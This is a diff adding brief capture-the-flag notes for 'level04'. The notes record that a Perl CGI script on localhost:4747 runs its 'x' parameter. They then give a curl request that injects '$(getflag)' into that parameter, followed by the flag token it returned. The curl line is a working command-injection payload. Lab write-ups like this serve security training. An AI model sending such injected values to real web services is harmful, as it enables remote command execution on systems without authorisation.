@@ -1,0 +1,8 @@
+Inspect level04.pl file
+- per script
+- CGI script execute param x 
+- on localhost:4747
+
+Exploit execution
+- curl 'localhost:4747/level04.pl?x=$(getflag)
+-> ne2searoevaevoem4ov4ar8ap
